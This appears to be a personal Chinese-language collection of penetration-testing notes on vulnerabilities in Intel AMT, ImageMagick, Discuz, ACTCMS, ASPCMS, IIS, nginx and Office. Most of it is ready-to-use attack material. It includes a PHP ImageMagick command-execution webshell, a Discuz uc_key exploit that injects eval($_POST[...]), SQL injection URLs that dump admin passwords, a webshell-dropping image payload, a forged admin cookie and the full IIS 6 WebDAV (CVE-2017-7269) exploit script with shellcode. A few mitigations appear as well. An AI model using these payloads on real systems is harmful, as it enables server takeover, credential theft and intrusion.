@@ -1,0 +1,325 @@
+http://www.securiteam.com/
+https://technet.microsoft.com/library/security/ms10-046
+https://www.seebug.org 是个找漏洞的好地方，还会给出相关漏洞
+
+
+
+漏洞利用程序使用内存地址工作，所以不少漏洞利用程序都是限定了操作系统与攻击应用的版本。
+变通办法是指一种设置或配置更改，它不能从根本上纠正漏洞，但有助于在应用更新之前封堵已知的攻击源。
+
+
+
+该漏洞的CVE编号为CVE-2017-5689能够影响到英特尔远程管理技术，包括Active Management Technology (AMT)、Intel Standard Manageability(ISM)和Intel Small Business Technology (SBT)软件，版本号由6开始到11.6。
+漏洞点：在进行认证时会将用户提交的数据使用strncmp()函数进行处理，但是在调用该函数时，编写的代码存在问题，导致任意用户无需密码便能登录。
+错误的代码：if(strncmp(computed_response, user_response, response_length))，这里在比较时，获取了用户提交数据的长度。
+利用：那么只要将登陆数据包中Authorization字段中的子字段response对应值全部删除，便能任意登录AMT的web管理页面。
+危害：通过漏洞登录web页面管理，添加管理用户，这时可以远程开关机；使用创建的用户通过Manageability Commander Tool、vnc可实现远程管理BIOS和操作系统。
+
+
+ImageMagick：
+做 Discuz（腾讯编写的php论坛模板） 和 PhpWind 这样的论坛的网站都会较大规模的应用到 验证码、水印、图片裁剪上传的图片等 功能，一般来说操作一多、一复杂、访问一多 GD 库就会撑不住，所以我们使用更好的 ImageMagick。Discuz论坛和WordPress博客比较常用。
+1.CVE-2016-3714:
+升级 ImageMagick（php组件也有） 到最新版本 7.0.1-1和6.9.3-10可以解决问题。
+当你上传了一个webshell，遇到下面的情况如何解决？
+php已经disable_functions=phpinfo,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source根据以前的经验，有的是使用dll扩展来执行命令，不过我从未测试过，现在有了新的姿势，当然也是要有ImageMagick组件了。
+<?php
+echo "Disable Functions: " . ini_get('disable_functions') . "\n";
+
+$command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];
+if ($command == '') {
+    $command = 'id';
+}
+$exploit = <<<EOF
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg"|$command")'
+pop graphic-context
+EOF;
+
+file_put_contents("KKKK.mvg", $exploit);
+$thumb = new Imagick();
+$thumb->readImage('KKKK.mvg');
+$thumb->writeImage('KKKK.png');
+$thumb->clear();
+$thumb->destroy();
+unlink("KKKK.mvg");
+unlink("KKKK.png");
+?>通过上传图片，ImageMagick进行处理比如说执行了convert exploit.jpg out.png，就可以利用漏洞来执行恶意代码。
+一种禁止的方法：
+通过配置策略文件暂时禁用ImageMagick，可在 “/etc/ImageMagick/policy.xml” 文件中添加如下代码：
+<policymap>
+  <policy domain="coder" rights="none" pattern="EPHEMERAL" />
+  <policy domain="coder" rights="none" pattern="URL" />
+  <policy domain="coder" rights="none" pattern="HTTPS" />
+  <policy domain="coder" rights="none" pattern="MVG" />
+  <policy domain="coder" rights="none" pattern="MSL" />
+</policymap>
+2.
+
+
+Discuz：http://www.discuz.net
+有两种系列一种是一般的直接带上版本号，还有一种是带上X和版本号
+1.使用插件比如说ImageMagick进行任意代码执行，在discuz中只需要普通的用户权限就可以使用ImageMagick
+2.X1.5 X2.5 X3用uc_key来get webshell
+使用Discuz！的配置文件在/config/config_ucenter.php ，在这个文件中uc_key（UC客户端与服务端通信的通信密钥）来getshell.
+或者从他的打包文件或者代码管理系统中得知
+如果一个服务器上只有UCenter Server是不能通过uc_key来获取该服务器上的webshell的（不过可以通过uc_key来将服务器上的数据并重置用户口令）。
+PHP版本
+	    $timestamp = time()+10*3600;
+	    $host="127.0.0.1";
+	    $uc_key="eapf15K8b334Bc8eBeY4Gfn1VbqeA0N5Waofq6J285Ca33i151e551g0l9f2l3dd";
+	    $code=urlencode(_authcode("time=$timestamp&action=updateapps", 'ENCODE', $uc_key));
+	    $cmd1='<?xml version="1.0" encoding="ISO-8859-1"?>
+	<root>
+	 <item id="UC_API">http://xxx\');eval($_POST[DOM]);//</item>
+	</root>';
+	    $cmd2='<?xml version="1.0" encoding="ISO-8859-1"?>
+	<root>
+	 <item id="UC_API">http://aaa</item>
+	</root>';
+	    $html1 = send($cmd1);
+	    $html2 = send($cmd2);
+	    echo $html2;
+发送对象都是/api/uc.php?code=".$code."
+整个利用代码我已经在放在文件夹中
+2.picwidth这个参数可以执行命令“||whoami&”等。点击网页右下角的裁剪按钮就触发了,picwidth这个在代码里面其实是传递给$cutwidth这个参数的
+if($ictype == 'block') {
+        require_once libfile('function/block');
+        $block = C::t('common_block')->fetch($_GET['bid']);
+        $cropfile = block_thumbpath($block, array('picflag' => intval($_GET['picflag']), 'pic' => $_GET['cutimg']));
+        $cutwidth = $block['picwidth'];
+        $cutheight = $block['picheight'];
+    } else {
+        $cutwidth = $_GET['cutwidth'];
+        $cutheight = $_GET['cutheight'];
+    }
+上传图片中$cutwidth和$cutheight都是用户可控的变量，执行命令是“%26%26mkdir tsrc||”。后直接点击左下角的裁剪，来触发ImageMagick处理，虽然会返回图片访问错误，但是命令却正常执行了，在upload下创建了一个文件夹。
+3.漏洞产生在\source\class\class_image.php文件中的Thumb_IM()函数
+$exec_str = $this->param['imageimpath'].'/convert -quality '....进行了字符拼接，但是没有对imageimpath的输入进行命令执行过滤，以至于之后执行命令就是任意命令执行
+discuz后台->上传->选择使用ImageMagick，然后就可以在“ImageMagick程序安装路径”中执行任意代码-》然后直接点击左下角的裁剪或者预览缩略图效果来启动ImageMagick就可执行
+
+W3CSchool:
+在学习svg的时候加入代码
+<image xlink:href="https://example.com/image.jpg&quot;|ls &quot;-la" x="0" y="0" height="640px" width="480px"/>
+<!--SVG 2 removed the need for the xlink namespace, so instead of xlink:href you should use href.-->
+也就是：
+<svg width="100%" height="100%" version="1.1" xmlns="http://www.w3.org/2000/svg">
+<image href="https://example.com/image.jpg&quot;|ls &quot;-la" x="0" y="0" height="640px" width="480px"/>
+</svg>
+
+ACTCMS：
+关键字：Copyright @ 2006 www.actcms.com
+关键字：ACTCMS管理系统-网站后台管理/admin/login.asp
+默认数据库：App_Data/DataBase.mdb
+默认账户：admin
+默认密码: admin
+1./plus/vote/index.asp id参数存在注入漏洞 
+2./User/User_Article.Asp?ModeID=1&action=adds&classid=-1’%20union%20select%201,2,3,4,5,admin_name%2B’|’%2Bpassword,7,8,9,10,11,12,13,14,15,16,17,18%20from%20admin_act%20where%20’1’=’1  
+3.使用的FCKeditor编辑器啊，actcms3.0以下版本
+admin/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connector
+进去以后使用上传漏洞。对于上传类型的设置整个系统当中有两处，一是网站基本设置当中的上传文件类型，这个主要是后台添加文章时候上传用的比如/UpFiles/Article/2012/3/30/2012033048948665.asp，另外一个则是用户组权限设置中的文件上传类型，这个是用于前台用户发表文章时候上传图片用的。
+/user/reg.asp
+/user/login.asp
+敏感文件：
+/user/upload.asp
+/conn.asp
+特殊文件:
+/api.asp
+/field.asp
+
+
+沧州新星传媒CMS（czqirencms）：
+/sitemap.xml xml地图，直接给出所有的网站包括后台
+
+
+
+iis6.0:
+IIS6.0 默认的可执行文件除了asp还包含这三种：
+.asa|.cer|.cdx
+在2003下存在以下两解析漏洞：
+1.asp;1.jpg  
+1.asp/1.jpg  在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。
+
+HTTP.SYS中的整数溢出漏洞MS15-034：
+GET / HTTP/1.1
+Host: stuff
+Range: bytes=0-18446744073709551615
+或者wget 127.0.0.1 –debug –header=”Range: bytes=0-18446744073709551615″ #最后的数字就是16个F
+wget –header="Range: bytes=18-18446744073709551615" http://127.0.0.1/welcome.png #造成蓝屏
+
+使用OPTIONS探查PROPFIND，如果允许的话CVE-2017-7269：
+#------------Our payload set up a ROP chain by using the overflow 3 times. It will launch a calc.exe which shows the bug is really dangerous.
+#written by Zhiniang Peng and Chen Wu. Information Security Lab & School of Computer Science & Engineering, South China University of Technology Guangzhou, China 
+#-----------Email: [email]edwardz@foxmail.com[/email]
+import socket  
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
+sock.connect(('127.0.0.1',80))  
+pay='PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n'
+pay+='If: <http://localhost/aaaaaaa'
+pay+='\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac'
+pay+='>'
+pay+=' (Not <locktoken:write1>) <http://localhost/bbbbbbb'
+pay+='\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81'
+shellcode='VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB6X6WMV7O7Z8Z8Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LMX1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XKQ3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJZ2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3ULY7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA'
+pay+=shellcode
+pay+='>\r\n\r\n'
+print pay
+sock.send(pay)  
+data = sock.recv(80960)  
+print data 
+sock.close
+
+
+
+IIS7.5解析漏洞：
+0.尝试访问/FCKeditor/editor/fckeditor.html
+1.上传图片，浏览，上传一个a.aspx一句话木马，名字为：a.aspx;.a.aspx.jpg..jpg
+也可上传a.asp的图片马,稍微修改一下就是a.asp;.a.aspx.jpg..jpg 
+上传图片，浏览，上传一个aspx的图片一句话木马，名字为：a.aspx.a;.a.aspx.jpg..jpg
+也可上传asp的图片马,稍微修改一下就是a.asp.a;.a.aspx.jpg..jpg 
+2.我们上传个php一句话马儿，其实就是php一句话改名为jpg
+/UploadFiles\image\php.jpg/.php
+
+
+
+在web服务器开启fast-CGI的时候，上传图片xx.jpg。内容为：
+<?php fputs(fopen('shell.php','w'),'<?php eval($_POST[shell])?>');?>
+这里使用的fput创建一个shell.php文件，并写入一句话。访问路径xx.jpg/.php，就会在该路径下生成一个一句话木马shell.php。这个漏洞在IIS 7.0/7.5，Nginx 8.03以下版本存在。
+*注：fast-CGI是CGI的升级版，CGI指的是在服务器上提供人机交互的接口，fast-CGI是一种常驻型的CGI。因为CGI每次执行时候，都需要用fork启用一个进程，但是fast-CGI属于激活后就一直执行，不需要每次请求都fork一个进程。比普通的CGI占的内存少。
+
+
+
+apache：
+apache解析的方式是从右向左解析，如果不能解析成功，就会想左移动一个，但是后台上传通常是看上传文件的最右的一个后缀，所以根据这个，可以将马命名为xx.php.rar，因为apache解析不了rar，所以将其解析为php，但是后台上传点就将其解析为rar，这样就绕过了上传文件后缀限制
+
+nginx：
+既然是从apache发展过来所以也是从右向左解析CVE-2013-4547：
+攻击版本：nginx 0.8.41 – 1.5.6(该问题已经在 Nginx 1.5.7 和 1.4.4 版本中修复。)
+http://127.0.0.1/a.jpg（这里是一个没有经过编码的空格）\0.php 
+那个空格会无效化location /protected/ {deny all;}
+
+Linux下php-fpm默认限制的后缀名为php，如未取消限制，访问将出现access denied。测试想要查看执行结果，需修改php-fpm.conf中的security.limit_extensions为空，即允许任意后缀名文件作为php解析。
+
+CVE-2016-1247：nginx本地提权漏洞，能够影响基于Debian系列的发行版
+大致原理：so文件并把路径写入到/etc/ld.so.preload文件的话，那么可以实现对geteuid()函数的hook，通过sudo来触发hook调用。而写入/etc/ld.so.preload就是因为nginx在配置log文件时采用的不安全权限设置使得入侵者可以生成自己的log，最后将其软链接到/etc/ld.so.preload文件。
+
+数据库备份功能那就可以直接通过交互将马放入数据库（注意交互中对字数的限制），现在大多数的cms已经把这种备份的功能取消了，或者禁用了。基本上都需要靠自己用数据库语句来执行马的导出。
+
+
+
+php多字节编码漏洞：
+PHP 5 <= 5.2.5
+PHP 4 <= 4.4.8
+漏洞本质：
+php 使用 php_escape_shell_cmd（escapeshellcmd）这个函数来转义命令行字符串时是作为单字节处理的
+而当操作系统设置了GBK、EUC-KR、SJIS等宽字节字符集时候，将这些命令行字符串传递给MySQL处理时是作为多字节处理的 。通过加一个字节来吞掉后面的转义字符。
+
+很多开源的系统都是通过设置客户端的字符集为二进制来防止多字节编码问题：
+mysql_query("SET character_set_connection=gbk, character_set_results=gbk, character_set_client=binary", $conn); 
+
+当使用mb_convert_encoding、iconv对字符集进行错误的转换时候，漏洞再次的出现了（GPC=ON时问题同样存在）
+$username = iconv('gbk','utf-8',$username);
+或
+$username = mb_convert_encoding($username,'utf-8','gbk'); 
+
+FCKeditor：
+
+1.不需要登录机制就可能可以直接使用
+2.默认情况下创建文件夹，其中的.会被替换成_这个符号。FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=%2Fshell.asp&NewFolderName=z&uuid=1244789975684 就会创建shell.asp
+
+
+
+ASPCMS2.0
+未验证权限，且存在注入漏洞
+admin/_content/_About/AspCms_AboutEdit.asp?id=19
+表名：aspcms_user
+列名：loginname、password
+利用EXP：admin/_content/_About/AspCms_AboutEdit.asp?id=19 and 1=2 union select 1,2,3,4,5,loginname,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,password,25,26,27,28,29,30,31,32,33,34,35 from aspcms_user where userid=1
+
+——————Cookies欺骗——————
+cookies:username=admin; ASPSESSIONIDAABTAACS=IHDJOJACOPKFEEENHHMJHKLG; LanguageAlias=cn; LanguagePath=%2F; languageID=1; adminId=1; adminName=admin; groupMenu=1%2C+70%2C+10%2C+11%2C+12%2C+13%2C+14%2C+20%2C+68%2C+15%2C+16%2C+17%2C+18%2C+3%2C+25%2C+57%2C+58%2C+59%2C+2%2C+21%2C+22%2C+23%2C+24%2C+4%2C+27%2C+28%2C+29%2C+5%2C+49%2C+52%2C+56%2C+30%2C+51%2C+53%2C+54%2C+55%2C+188%2C+67%2C+63%2C+190%2C+184%2C+86%2C+6%2C+32%2C+33%2C+34%2C+8%2C+37%2C+183%2C+38%2C+60%2C+9; GroupName=%B3%AC%BC%B6%B9%DC%C0%ED%D4%B1%D7%E9
+
+/admin/_Style/AspCms_TemplateEdit.asp?acttype=&filename=../../../index.asp
+
+在aspcms程序后台中修改幻灯片的时候，其实是会在config文件夹写入代码的，如果这时候黑客们通过在幻灯片提交页面做简单的代码修改就可以把一句话木马注入到config/AspCms_Config.asp这文件中
+
+请求头Cookie里面：loginstatus=0改为loginstatus=1就会有sql报错出现，语句是select * from AspCmd_User where UserID=，所以在Cookies中再加上UserID来执行sql注入。
+
+在ASPCMS2.3.x中，ASPCMS的数据库在/data/目录下，为了防止数据库被下载，把数据库文件data.mdb重新命名为#data.asp，由于设置不当，使用%23编码#即可绕过访问，导致信息泄漏http://www.hsbao.com/data/%23data.asp 直接访问会被阻拦
+
+NindonCMS源于AspCMS
+/plug/comment/commentList.asp sql注入漏洞 
+
+
+
+
+2017年6月13日  CVE-2017-8543  当Windows搜索处理（WSS）内存中的对象时，存在远程执行代码漏洞，攻击者可以向Windows Search服务发送精心构造的SMB消息，从而利用此漏洞提升权限并控制计算机。 
+影响：
+桌面系统
+    Microsoft Windows 10 Version 1607 for 32-bit Systems
+    Microsoft Windows 10 Version 1607 for x64-based Systems
+    Microsoft Windows 10 for 32-bit Systems
+    Microsoft Windows 10 for x64-based Systems
+    Microsoft Windows 10 version 1511 for 32-bit Systems
+    Microsoft Windows 10 version 1511 for x64-based Systems
+    Microsoft Windows 10 version 1703 for 32-bit Systems
+    Microsoft Windows 10 version 1703 for x64-based Systems
+    Microsoft Windows 7 for 32-bit Systems SP1
+    Microsoft Windows 7 for x64-based Systems SP1
+    Microsoft Windows 8.1 for 32-bit Systems
+    Microsoft Windows 8.1 for x64-based Systems
+    Microsoft Windows RT 8.1
+服务器系统 
+    Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1
+    Microsoft Windows Server 2008 R2 for x64-based Systems SP1
+    Microsoft Windows Server 2008 for 32-bit Systems SP2
+    Microsoft Windows Server 2008 for Itanium-based Systems SP2
+    Microsoft Windows Server 2008 for x64-based Systems SP2
+    Microsoft Windows Server 2012
+    Microsoft Windows Server 2012 R2
+    Microsoft Windows Server 2016
+
+
+CVE-2010-2568  造成该漏洞的原因是 Windows 错误地分析快捷方式，当操作系统显示恶意快捷方式文件的图标时，可能执行恶意代码。 成功利用此漏洞的攻击者可能以登录用户的身份运行任意代码。 
+1.  成功利用此漏洞的攻击者可以获得与本地用户相同的用户权限。 那些帐户被配置为拥有较少系统用户权限的用户比具有管理用户权限的用户受到的影响要小。
+2.  对于 USB 可移动设备攻击媒介，当自动播放被禁用时，用户必须手动启动 Windows 资源管理器或类似应用程序并浏览到可移动磁盘的受影响文件夹才会让漏洞得以利用。
+解决的变通方法：
+（1）禁止快捷方式的图标显示  删除了注册表中相关的两个值，这两个值原本都是{00021401-0000-0000-C000-000000000046}
+    单击“开始”，单击“运行”，在“打开”框中键入 Regedit，然后单击“确定”。找到并随后选择下列注册表项：HKEY_CLASSES_ROOT\lnkfile\shellex\IconHandler 单击“文件”菜单，然后单击“导出”。在“导出注册表文件”对话框中，键入 LNK_Icon_Backup.reg，然后单击“保存”。注意 默认情况下，此操作将在“我的文档”文件夹中创建此注册表项的备份。在注册表编辑器的右窗口中选择值“(默认)”。 按 Enter 编辑注册表项的值。 删除值，以便值为空白，然后按 Enter。
+    找到并随后选择下列注册表项：HKEY_CLASSES_ROOT\piffile\shellex\IconHandler 单击“文件”菜单，然后单击“导出”。在“导出注册表文件”对话框中，键入 PIF_Icon_Backup.reg，然后单击“保存”。注意 默认情况下，此操作将在“我的文档”文件夹中创建此注册表项的备份。在注册表编辑器的右窗口中选择值“(默认)”。 按 Enter 编辑注册表项的值。 删除值，以便值为空白，然后按 Enter。
+    注销所有用户并再次登录，或重新启动计算机。
+（2）禁用Web客户端服务（WebClient）
+禁用 Web 客户端服务可以通过 Web 分布式创作和版本管理 (WebDAV) 客户端服务来阻止最可能的远程攻击媒介，从而帮助保护受影响的系统免受此漏洞的危害。 在应用此变通办法后，成功利用此漏洞的远程攻击者仍有可能使 Microsoft Office Outlook 执行位于目标用户计算机或局域网 (LAN) 上的程序，但是在打开来自 Internet 的任意程序之前，会提示用户给予确认。
+这个服务用来上传与下载文件：使基于 Windows 的程序能创建、访问和修改基于 Internet 的文件
+  WebClient   类提供四种将数据上载到资源的方法：     
+  OpenWrite   返回一个用于将数据发送到资源的   Stream。     
+  UploadData   将字节数组发送到资源并返回包含任何响应的字节数组。     
+  UploadFile   将本地文件发送到资源并返回包含任何响应的字节数组。     
+  UploadValues   将   NameValueCollection   发送到资源并返回包含任何响应的字节数组。   
+     
+  WebClient   类还提供三种从资源下载数据的方法：     
+  DownloadData   从资源下载数据并返回字节数组。     
+  DownloadFile   从资源将数据下载到本地文件。     
+  OpenRead   从资源以   Stream   的形式返回数据。
+一般可以禁用这个服务，会提高安全性，但是会影响与.NET相关的一些微软程序，比如MSNExplorer, 、MediaPlayer、NetMeeting、Messenger
+（3） 阻止从 Internet 下载 LNK 和 PIF 文件
+在 Internet 网关上阻止下载 LNK 和 PIF 文件可防止这些攻击。 请注意，文件可通过 WebDAV 传输，因此任何阻止解决方案应该考虑此协议。原来可以对下载的文件后缀名进行限制。
+（4）在外围防火墙处阻止出站 SMB 连接
+在外围防火墙上阻止出站 SMB 连接将减少使用文件共享远程利用此漏洞的风险。
+
+
+
+RDP8.1
+增加一个Restricted Admin mode
+我们只需要在程序中发送包的时候设置RESTRICTED_ADMIN_MODE_REQUIRED flag，然后使用a null domain, null username and null password于TSPasswordCreds structure进行登录。
+
+
+office软件漏洞：
+RTF文件 CVE-2017-0199 
+影响范围；
+	Microsoft Office 2016
+	Microsoft Office 2013
+	Microsoft Office 2010
+	Microsoft Office 2007
+该漏洞利用OFFICE OLE对象链接技术，将包裹的恶意链接对象嵌在文档中，OFFICE调用URL Moniker（COM对象）将恶意链接指向的HTA文件下载到本地， URL Moniker通过识别响应头中content-type的字段信息最后调用mshta.exe将下载到的HTA文件执行起来。
+相关网站：https://zhuanlan.zhihu.com/p/26522540
